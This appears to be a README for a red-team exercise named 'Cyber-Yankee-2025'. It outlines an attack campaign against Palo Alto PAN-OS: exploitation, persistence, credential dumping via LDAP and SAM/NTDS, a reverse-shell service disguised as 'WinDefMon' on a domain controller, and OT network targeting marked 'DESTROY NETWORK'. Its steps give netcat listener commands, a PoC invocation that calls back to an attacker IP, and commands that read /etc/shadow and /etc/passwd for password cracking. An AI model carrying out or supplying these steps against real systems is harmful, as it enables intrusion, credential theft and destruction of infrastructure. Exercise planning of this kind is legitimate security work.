# Cyber-Yankee-2025

## Sassy Panda

[Phase01](Phase01) - #PanOS Exploit

[Phase02](Phase02) - #PanOS Internal Reconnaissance & Enumeration

[Phase03](Phase03) - #PanOS Persistence

[Phase04](Phase04) - #PanOS proxy chains

---

[Phase05](Phase05) - #Discovery Inside Orange Space

[Phase06](Phase06) - #Credential Access (via LDAP, SAM/NTDS)

---

[Phase07](Phase07) - Lateral Movement and Persistence *DAY 3*

[Phase08](Phase08) - `WinDefMon` Reverse Shell Service on DC

[Phase09](Phase09) - OT Network Target Prep (Later Stage) *DAY 4* - DESTROY NETWORK

[Phase20](Phase20) - Clean the environment

## Steps

1. initial access - setup initial listener (netcat/metasploit) with your 61574
    run command: `nc -lvnp 61574`
2. setup callback listener 63842
    run command: `nc -lvnp 63842`
3. run python:
    `python Poc.py https://<TARGET_PAL_WEB_INTERFACE_IP> <ATTACKER_IP> <ATTACKER_PORT>` # Random high port chosen in script from above
4. once exploit is through, look at initial listener and wait for callback to catch. once callback catches perform
    run command:
    `whoami` # detect who we are
    `cat /etc/shadow` # grab the users on the machine
    `cat /etc/passwd` # grab what shell permissions every user has
    `uname -a` # detect what machine we are running
5.  Add passwords to rockyou.txt
